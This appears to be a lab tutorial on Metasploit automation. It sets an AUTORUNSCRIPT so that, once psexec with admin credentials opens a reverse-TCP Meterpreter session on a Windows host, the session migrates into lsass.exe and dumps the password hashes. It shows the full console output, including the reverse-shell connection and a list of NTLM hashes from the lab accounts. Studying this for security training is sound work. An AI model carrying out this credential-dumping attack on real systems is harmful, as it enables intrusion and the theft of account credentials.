## Storing commands in the file for further automation:
```python
┌──(root㉿kali)-[/home/hyok]
└─# cat >  autoruncmds.rc          
migrate -N lsass.exe
hashdump
^C
```
- First, we need to create a file with the commands we want to execute.
- In this example, we will migrate to the `lsass.exe` process and dump the windows hashes.

## Next, we will use the `exploit/windows/smb/psexec` exploit module to compromise the target:
- `AUTORUNSCRIPT` to specify the command we want to execute as soon as we receive a new session:
- By setting `AUTORUNSCRIPT`, we can automatically run scripts on session creation.
- In this example, we will use the `multi_console_command` script, which allows us to specify multiple commands to run.
- Use `-c` followed by the commands to execute, enclosed in double quotes and separated by a comma or use `-r` and the path to the file with a list of commands, one per line.
```python
msf6 > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set RHOST 192.168.216.11
RHOST => 192.168.216.11
msf6 exploit(windows/smb/psexec) > set SMBUSER Administrator
SMBUSER => Administrator
msf6 exploit(windows/smb/psexec) > set SMBPASS vagrant
SMBPASS => vagrant
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set AUTORUNSCRIPT multi_console_command -r /home/hyok/autoruncmds.rc
AUTORUNSCRIPT => multi_console_command -r /home/hyok/autoruncmds.rc
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 192.168.216.9:4444 
[*] 192.168.216.11:445 - Connecting to the server...
[*] 192.168.216.11:445 - Authenticating to 192.168.216.11:445 as user 'Administrator'...
[*] 192.168.216.11:445 - Selecting PowerShell target
[*] 192.168.216.11:445 - Executing the payload...
[+] 192.168.216.11:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (200774 bytes) to 192.168.216.11
[*] Session ID 2 (192.168.216.9:4444 -> 192.168.216.11:49270) processing AutoRunScript 'multi_console_command -r /home/hyok/autoruncmds.rc'
[*] Running Command List ...
[*] 	Running command migrate -N lsass.exe
[*] Migrating from 4920 to 484...
[*] Migration completed successfully.
[*] 	Running command hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
anakin_skywalker:1011:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::
artoo_detoo:1007:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::
ben_kenobi:1009:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859:::
boba_fett:1014:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9:::
chewbacca:1017:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8:::
c_three_pio:1008:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee:::
darth_vader:1010:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0:::
greedo:1016:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
han_solo:1006:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951:::
jabba_hutt:1015:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76:::
jarjar_binks:1012:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4:::
kylo_ren:1018:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001:::
lando_calrissian:1013:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f:::
leia_organa:1004:aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028:::
luke_skywalker:1005:aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a:::
sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
[*] Meterpreter session 2 opened (192.168.216.9:4444 -> 192.168.216.11:49270) at 2023-03-16 15:08:47 +0530
```